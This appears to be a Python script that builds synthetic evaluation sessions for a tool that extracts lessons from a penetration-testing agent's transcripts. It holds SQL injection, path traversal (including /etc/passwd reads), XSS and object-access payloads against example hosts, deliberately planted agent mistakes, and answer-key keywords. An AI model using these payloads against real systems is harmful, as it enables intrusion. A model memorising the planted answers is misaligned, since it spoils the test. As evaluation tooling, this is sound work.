"""Builds the evaluation sessions in eval/sessions/ (run: python build_sessions.py).

Each file is `{skillId, plantedMistakes, plantedIdentifiers, transcript}`: a synthetic session
(master plan P3: example.com / example.org hosts, 192.0.2.0/24, 198.51.100.0/24, 2001:db8::/32)
with four planted mistakes, the ones the evaluation looks for in Skiller's lessons:
- `hang`: a tool option that makes the tool hang or time out;
- `repeat`: the same payload family repeated without new information;
- `verify`: a conclusion reached without the verification the technique needs;
- `guidance`: a person correcting the agent.
`plantedIdentifiers` are the session-specific values that must never reach a proposal; the
rubric's keywords map a lesson to a mistake (README.md, "Rubric").

`user_skill` runs on one of the person's own skills (platform 1.1.0): its spec also carries
`userSkill {name, description, content}`, which run_eval.py creates first, and its transcript
names the skill as USER_SKILL_PLACEHOLDER, replaced by the created skill's id at run time. The
agent's record of the skill's text (`contentSha256`) does not depend on the id, so it is built
here.
"""

from __future__ import annotations

import json
import pathlib
import sys

HERE = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent / "tests" / "fixtures"))

from sessions_build import Session, user_record  # noqa: E402

OUT = HERE / "sessions"
USER_SKILL_PLACEHOLDER = "__USER_SKILL_ID__"


def sql_injection() -> dict:
    host, ip, path = "store.example.org", "198.51.100.40", "/catalog/item"
    url = f"http://{host}{path}?sku=AB-7731&ref=hp"
    flag = "FLAG{eval_sqli_b51c}"
    s = Session("session_eval_sqli_000000001", f"Check {host} catalog")
    s.user(f"Assess {host} ({ip}) for SQL injection in the catalog page.")
    s.classify("sql_injection")
    s.turn("Fetch the catalog page.", "execute_curl", {"args": f"-s -i '{url}'"}, raw="HTTP/1.1 200 OK\n\n<html>catalog</html>",
           summary="The page answers 200.")
    s.turn("Run sqlmap over the whole site with a deep crawl.", "kali_shell",
           {"command": f"sqlmap -u 'http://{host}/' --crawl 5 --forms --threads 10 --batch"}, ok=False,
           raw="[CRITICAL] connection timed out\n[WARNING] crawling stalled", summary="sqlmap hung while crawling.",
           ms=600_000, tier="orange", stall=1)
    for i in range(3):
        s.turn("Try a UNION probe.", "execute_curl", {"args": f"-s '{url}%27%20UNION%20SELECT%20NULL--'"}, ok=False,
               raw="HTTP/1.1 403 Forbidden\nRequest blocked", summary="Blocked by the filter.",
               tier="red" if i else "orange", stall=2 + i)
    s.deep_think("productivity tier red", "The UNION family is blocked; try boolean or time-based probes.")
    s.guidance("Stop the UNION probes, compare a true and a false boolean condition on sku instead.")
    s.turn("Report injection from the database error alone.", "execute_curl", {"args": f"-s '{url}%27'"},
           raw="HTTP/1.1 500\nSQL syntax error near ''AB-7731''", summary="A database error: injectable.",
           findings=[f"SQL injection in sku at {path}"], phase="exploitation")
    s.turn("Dump the flag.", "kali_shell", {"command": f"sqlmap -u '{url}' -p sku --technique=B --threads 1 --batch"},
           raw=f"[INFO] sku is vulnerable\nretrieved: {flag}", summary="Boolean-based injection confirmed.")
    s.report(f"Injection in sku on {host}; flag {flag}.")
    return {
        "skillId": "sql_injection",
        "plantedMistakes": [
            {"id": "M1", "kind": "hang", "keywords": ["crawl", "thread", "timeout", "time out", "hang", "stall"]},
            {"id": "M2", "kind": "repeat", "keywords": ["union", "same payload", "repeat", "blocked", "family"]},
            {"id": "M3", "kind": "verify", "keywords": ["boolean", "true and false", "confirm", "error alone",
                                                        "false positive", "verify"]},
            {"id": "M4", "kind": "guidance", "keywords": ["one parameter", "boolean", "compare"]},
        ],
        "plantedIdentifiers": [host, ip, path, "AB-7731", "sku", flag, "session_eval_sqli_000000001"],
        "transcript": s.transcript(),
    }


def path_traversal() -> dict:
    host, ip = "files.example.com", "192.0.2.77"
    url = f"http://{host}/download?doc=report-q3.pdf"
    flag = "FLAG{eval_lfi_9d02}"
    s = Session("session_eval_lfi_0000000001", f"Download endpoint on {host}")
    s.user(f"Test {host} ({ip}) download endpoint for path traversal.")
    s.classify("path_traversal")
    s.turn("Fetch a normal document.", "execute_curl", {"args": f"-s -i '{url}'"}, raw="HTTP/1.1 200 OK\nContent-Type: application/pdf")
    s.turn("Fuzz with the biggest wordlist and no timeout.", "execute_ffuf",
           {"args": f"-u 'http://{host}/download?doc=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -t 200"},
           ok=False, raw="[ERROR] context deadline exceeded", summary="ffuf timed out.", ms=600_000, tier="orange", stall=1)
    for i in range(3):
        s.turn("Try ../ again.", "execute_curl", {"args": f"-s 'http://{host}/download?doc=../../../../etc/passwd'"},
               ok=False, raw="HTTP/1.1 400 Bad Request\ninvalid path", summary="Rejected.", tier="red" if i else "orange",
               stall=2 + i)
    s.guidance("The filter strips ../ once; try double URL encoding of the dots and slashes.")
    s.turn("Claim traversal from a 200 status.", "execute_curl",
           {"args": f"-s -o /dev/null -w '%{{http_code}}' 'http://{host}/download?doc=..%252f..%252fetc%252fpasswd'"},
           raw="200", summary="Status 200: traversal works.", findings=["path traversal in doc"], phase="exploitation")
    s.turn("Read the file content.", "execute_curl",
           {"args": f"-s 'http://{host}/download?doc=..%252f..%252f..%252fflag.txt'"}, raw=flag, summary="Flag read.")
    s.report(f"Traversal on {host}; flag {flag}.")
    return {
        "skillId": "path_traversal",
        "plantedMistakes": [
            {"id": "M1", "kind": "hang", "keywords": ["wordlist", "timeout", "time out", "threads", "smaller", "hang"]},
            {"id": "M2", "kind": "repeat", "keywords": ["same encoding", "repeat", "../", "rejected", "family", "variant"]},
            {"id": "M3", "kind": "verify", "keywords": ["content", "status code", "status alone", "200", "verify",
                                                        "proof"]},
            {"id": "M4", "kind": "guidance", "keywords": ["double", "encoding", "encode"]},
        ],
        "plantedIdentifiers": [host, ip, "/download", "report-q3.pdf", "doc", flag, "session_eval_lfi_0000000001"],
        "transcript": s.transcript(),
    }


def xss() -> dict:
    host, ip6 = "forum.example.org", "2001:db8::5"
    url = f"http://{host}/search?q=test&lang=en-GB"
    flag = "FLAG{eval_xss_e7a4}"
    s = Session("session_eval_xss_0000000001", f"Search box on {host}")
    s.user(f"Look for XSS in the search box of {host} ({ip6}).")
    s.classify("xss")
    s.turn("Reflect a marker.", "execute_curl", {"args": f"-s '{url.replace('test', 'zq7marker')}'"},
           raw="<p>Results for zq7marker</p>", summary="The marker is reflected in a paragraph.")
    s.turn("Run dalfox with every deep option.", "kali_shell",
           {"command": f"dalfox url '{url}' --deep-domxss --mining-dict --waf-evasion --worker 100"}, ok=False,
           raw="[ERROR] scan timeout", summary="dalfox timed out.", ms=600_000, tier="orange", stall=1)
    for i in range(3):
        s.turn("Try a script tag.", "execute_curl", {"args": f"-s '{url.replace('test', '%3Cscript%3Ealert(1)%3C/script%3E')}'"},
               ok=False, raw="<p>Results for &lt;script&gt;alert(1)&lt;/script&gt;</p>", summary="Encoded.",
               tier="red" if i else "orange", stall=2 + i)
    s.guidance("Check where the input lands first: it is inside an attribute on the next page, not in the paragraph.")
    s.turn("Report XSS because the payload is reflected.", "execute_curl",
           {"args": f"-s '{url.replace('test', '%22onmouseover%3Dalert(1)')}'"},
           raw='<input value=""onmouseover=alert(1)">', summary="Reflected: XSS.", findings=["reflected XSS in q"],
           phase="exploitation")
    s.turn("Confirm execution in a browser.", "execute_playwright", {"url": url}, raw=f"dialog opened; cookie {flag}",
           summary="The alert fired.")
    s.report(f"Reflected XSS on {host}; flag {flag}.")
    return {
        "skillId": "xss",
        "plantedMistakes": [
            {"id": "M1", "kind": "hang", "keywords": ["deep", "timeout", "time out", "worker", "hang", "scanner"]},
            {"id": "M2", "kind": "repeat", "keywords": ["script tag", "same payload", "encoded", "repeat", "family"]},
            {"id": "M3", "kind": "verify", "keywords": ["execut", "browser", "playwright", "fire", "verify", "confirm"]},
            {"id": "M4", "kind": "guidance", "keywords": ["context", "attribute", "where the input"]},
        ],
        "plantedIdentifiers": [host, ip6, "/search", "lang", "en-GB", "zq7marker", flag, "session_eval_xss_0000000001"],
        "transcript": s.transcript(),
    }


def user_skill() -> dict:
    host, ip = "portal.example.org", "198.51.100.61"
    text = ("# Object access checklist\n"
            "1. List the API endpoints that take an object id, with execute_curl.\n"
            "2. For each, request an object of another account and compare the answer with your own.\n"
            "3. Fuzz the id range with ffuf when the ids are sequential.\n"
            "Report only what you can show with two accounts. Do not test hosts outside the scope.\n")
    ref = f"user_skill:{USER_SKILL_PLACEHOLDER}"
    s = Session("session_eval_user_0000000001", f"Object access on {host}")
    s.user(f"Use my object access checklist on {host} ({ip}).")
    s.classify(ref, user_record(text, USER_SKILL_PLACEHOLDER))
    s.turn("List the endpoints.", "execute_curl", {"args": f"-s 'http://{host}/api/v2/invoices/4410'"},
           raw='{"id": 4410, "owner": "acct-17"}', summary="The invoice endpoint takes a numeric id.")
    s.turn("Fuzz every id with a huge list and many threads.", "kali_shell",
           {"command": f"ffuf -u 'http://{host}/api/v2/invoices/FUZZ' -w /usr/share/seclists/ids-10M.txt -t 200"},
           ok=False, raw="[ERR] timeout\n:: Progress: [3/10000000] :: Errors: 3", summary="ffuf timed out.",
           ms=600_000, tier="orange", stall=1)
    for i in range(3):
        s.turn("Request the next invoice.", "execute_curl", {"args": f"-s 'http://{host}/api/v2/invoices/4411'"},
               ok=False, raw='{"error": "forbidden"}', summary="Forbidden.", tier="red" if i else "orange", stall=2 + i)
    s.guidance("Log in as the second account and request its own invoice id 4412 from the first account's session.")
    s.turn("Report broken access control because one id answered 200.", "execute_curl",
           {"args": f"-s 'http://{host}/api/v2/invoices/4409'"}, raw='{"id": 4409, "owner": "acct-17"}',
           summary="200 OK.", findings=[f"Object access on http://{host}/api/v2/invoices"], phase="exploitation")
    s.turn("Compare with the second account.", "execute_curl",
           {"args": f"-s -H 'Cookie: sid=acct-17' 'http://{host}/api/v2/invoices/4412'"},
           raw='{"id": 4412, "owner": "acct-18"}', summary="Another account's invoice is returned: confirmed.")
    s.report(f"Broken access control on {host}: invoice 4412 of acct-18 read as acct-17.")
    return {
        "skillId": ref,
        "userSkill": {"name": "Eval object access checklist",
                      "description": "Checks API endpoints that take an object id for access by another account.",
                      "content": text},
        "plantedMistakes": [
            {"id": "M1", "kind": "hang", "keywords": ["wordlist", "threads", "timeout", "time out", "smaller", "hang"]},
            {"id": "M2", "kind": "repeat", "keywords": ["same id", "repeat", "forbidden", "403", "again", "family"]},
            {"id": "M3", "kind": "verify", "keywords": ["two accounts", "second account", "owner", "200 alone",
                                                        "status alone", "verify", "proof"]},
            {"id": "M4", "kind": "guidance", "keywords": ["second account", "another account", "own object", "compare"]},
        ],
        "plantedIdentifiers": [host, ip, "/api/v2/invoices", "4412", "acct-17", "acct-18", "session_eval_user_0000000001"],
        "transcript": s.transcript(),
    }


SESSIONS = {"sql_injection": sql_injection, "path_traversal": path_traversal, "xss": xss, "user_skill": user_skill}


def render(name: str) -> str:
    return json.dumps(SESSIONS[name](), indent=1, ensure_ascii=False) + "\n"


def main() -> None:
    OUT.mkdir(exist_ok=True)
    for name in SESSIONS:
        (OUT / f"{name}.json").write_text(render(name), encoding="utf-8")
    print(f"wrote {len(SESSIONS)} evaluation sessions to {OUT}")


if __name__ == "__main__":
    main()
